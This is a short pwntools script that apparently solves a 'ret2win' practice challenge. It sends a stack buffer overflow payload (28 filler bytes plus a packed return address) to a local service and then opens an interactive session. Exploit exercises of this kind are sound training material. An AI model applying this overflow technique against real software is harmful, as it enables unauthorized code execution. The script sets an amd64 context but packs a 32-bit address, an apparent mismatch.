from pwn import *

context.arch = 'amd64'

p = remote('127.0.0.1', 2001)
#p = process('./ret2win')

addr_win = p32(0x080491e6)

payload = b"A" * 28
payload += addr_win

p.send(payload) 
p.interactive()
